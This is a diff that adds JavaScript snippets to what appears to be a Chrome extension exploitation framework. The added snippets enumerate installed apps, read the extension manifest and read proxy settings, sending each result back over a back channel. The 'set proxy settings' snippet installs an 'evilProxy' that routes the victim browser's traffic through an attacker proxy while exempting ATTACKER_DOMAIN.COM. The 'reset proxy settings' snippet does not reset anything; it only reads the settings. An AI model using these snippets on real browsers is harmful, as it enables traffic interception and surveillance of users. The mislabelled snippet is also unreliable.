@@ -149,11 +149,67 @@ x.send(null);
 })();
 </snippet>
 <snippet type="eval-ext-snippets" name="get installed apps">
-// requires management permission
+// requires management permission, by @theKos
 try {
   chrome.management.getAll(function(list){log({type:'recveval',result: list})})
 } catch (e){
   log({type:'recveval', result:false});
+}
+</snippet>
+<snippet type="eval-ext-snippets" name="extension has plugins?">
+// by @theKos
+x = new XMLHttpRequest();
+x.onreadystatechange = function() {
+   var d;
+  try {
+    d=JSON.parse(x.responseText);
+ } catch (e) {d=x.responseText}
+if (x.readyState == 4) {
+   if (d['plugins']){
+      log({type:'recveval', result:d['plugins']});
+   } else {
+      log({type:'recveval', result:false});
+   }
+}
+};
+x.open('GET','/manifest.json',true);
+x.send(null);
+</snippet>
+<snippet type="eval-ext-snippets" name="get proxy settings">
+// by @theKos, requires proxy permission
+try {
+   chrome.proxy.settings.get({'incognito': false},function(config) {log({type:'recveval', result:config})});
+} catch (e){
+   log({type:'recveval', result:false});
+}
+</snippet>
+<snippet type="eval-ext-snippets" name="set proxy settings">
+// by @theKos, requires proxy permission
+// WARNING, COULD POTENTIALLY BREAK BACK CHANNEL
+var evilProxy = {
+    "mode": "fixed_servers",
+    "rules": {
+        "bypassList": ["&lt;local&gt;","ATTACKER_DOMAIN.COM"], // EXCLUDE BACK CHANNEL FROM PROXY
+        "singleProxy": {
+            "host": "localhost", // ATTACKER PROXY IP
+            "port": 8080, // ATTACKER PROXY PORT
+            "scheme": "http" // ATTACKER PROXY SCHEME
+        }
+    }
+}
+
+try {
+   chrome.proxy.settings.set({value: evilProxy, scope: 'regular'},function() {log({type:'recveval', result:'Proxy settings updated!'})});
+} catch (e){
+   log({type:'recveval', result:'error '+e});
+}
+</snippet>
+<snippet type="eval-ext-snippets" name="reset proxy settings">
+// requires proxy permission
+try {
+   chrome.proxy.settings.get({'incognito': false},function(config) {log({type:'recveval', result:config})});
+} catch (e){
+   log({type:'recveval', result:false});
 }
 </snippet>
 </snippets>
